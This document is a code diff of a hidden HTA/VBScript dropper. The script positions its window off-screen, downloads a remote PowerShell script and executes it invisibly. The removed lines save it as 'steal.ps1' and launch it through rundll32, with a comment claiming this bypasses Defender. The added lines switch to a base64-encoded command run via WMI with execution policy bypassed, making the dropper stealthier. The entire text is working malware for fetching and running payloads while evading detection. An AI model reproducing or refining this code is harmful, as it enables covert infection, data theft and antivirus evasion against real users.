@@ -5,7 +5,7 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, xh, ps1Content
+Dim sh, fso, xh, ps1Content, xml, node, stream, b64Payload
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -17,24 +17,29 @@ xh.Send
 If xh.Status = 200 Then
     ps1Content = xh.responseText
     Set xh = Nothing
-
-    Dim tempPs1 : tempPs1 = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
-    Dim f : Set f = fso.CreateTextFile(tempPs1, True)
-    f.Write ps1Content
-    f.Close
-
-    ' Create hidden VBS launcher
-    Dim tempVbs : tempVbs = sh.ExpandEnvironmentStrings("%TEMP%") & "\launcher.vbs"
-    Dim v : Set v = fso.CreateTextFile(tempVbs, True)
-    v.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
-    v.WriteLine "sh.Run ""powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -File """"" & tempPs1 & """""", 0, False"
-    v.Close
-
-    ' Run via rundll32 (No cmd box, bypasses Defender)
-    sh.Run "rundll32.exe url.dll,FileProtocolHandler """ & tempVbs & """", 0, False
+    
+    ' Base64 Encode the payload
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set node = xml.CreateElement("b64")
+    node.dataType = "bin.base64"
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 2
+    stream.Charset = "unicode"
+    stream.Open
+    stream.WriteText ps1Content
+    stream.Position = 0
+    stream.Type = 1
+    node.nodeTypedValue = stream.Read
+    b64Payload = node.text
+    
+    ' Run via WMI (Hidden, no cmd, no hang)
+    Dim finalCmd : finalCmd = "powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64Payload
+    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Dim proc: Set proc = wmi.Get("Win32_Process")
+    proc.Create finalCmd, Null, Null
 End If
 
-' Kill HTA instantly (No popups)
+' Close instantly
 window.close()
 </script>
 </head><body></body></html>
